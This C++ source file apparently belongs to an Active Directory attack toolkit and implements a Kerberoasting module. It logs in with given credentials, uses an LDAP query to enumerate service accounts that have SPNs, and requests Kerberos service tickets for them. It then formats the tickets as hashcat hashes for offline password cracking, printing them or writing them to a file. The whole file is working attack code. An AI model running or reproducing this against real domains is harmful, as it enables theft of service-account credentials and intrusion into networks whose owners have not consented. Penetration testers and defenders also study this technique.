#include <iostream>
#include "Attacks.h"
#include "../../protocols/LdapConnection.h"
#include "../../protocols/KerberosInteraction.h"
#include <string>
#include <vector>
#include "../../utils/Utils.h"
#include "../../utils/Colors.h"
#include "../../cli/ArgumentParser.h"

Attacks::Kerberoast::Kerberoast(LdapQuerier& _ldap, KerberosInteraction& _krb, const std::string& _user, const std::string& _pass)
        : ldap(_ldap), krb(_krb), username(_user), password(_pass) 
    {
        krb.requestAndCacheTGT(username, password);
    }

std::vector<std::string> Attacks::Kerberoast::listUser(const std::string& baseDN) {
    std::cout << "[*] Enumerating kerberoastable users" << std::endl;

    std::string query = "(&(servicePrincipalName=*)(!(objectClass=computer)))";
    std::vector<std::string> attrs = {"sAMAccountName", "servicePrincipalName"};
    std::vector<std::string> kerberoastable_users_spns;

    auto results = ldap.executeQueryAndUnpackData(baseDN, query, attrs);

    for (const auto& userObject : results) {
        auto user = userObject.find("sAMAccountName");
        auto spn = userObject.find("servicePrincipalName");

        if (user != userObject.end() && !user->second.empty()) {
            std::string username = user->second.front();
            if (username == "krbtgt") {
                continue;
            }
            std::cout << Colors::COLOR_YELLOW << "  [+] User: " << username << Colors::COLOR_RESET << std::endl;
            if (spn != userObject.end()) {
                for (const auto& _spn : spn->second) {
                    kerberoastable_users_spns.push_back(_spn); 
                }
            }
        }
    }
    return kerberoastable_users_spns;
}

std::pair<std::string, std::string> Attacks::Kerberoast::requestTicket(const std::string& spn) {
    std::string hashcat_ticket = krb.requestAndFormatTGS(spn, this->username);
    if (hashcat_ticket.empty()) {
        return {"", ""};
    }
    return {spn, hashcat_ticket};
}

void Attacks::Kerberoast::run(const ModuleRuntimeContext& ctx) {
    std::vector<std::string> spns = listUser(ctx.baseDN);
    std::vector<std::pair<std::string, std::string>> results_to_save;
    bool save_to_file = !ctx.outputFilePath.empty();
    
    for (std::string target : spns) {
        auto result = requestTicket(target);
            
        if (!result.second.empty()) {
            std::cout << "[+] Ticket obtained for " << target << std::endl;
                if (save_to_file) {
                    results_to_save.push_back(result);
                } else {
                    std::cout << result.second << "\n\n";
                }
            }
    }
    Utils::saveToFile(results_to_save, ctx.outputFilePath);
}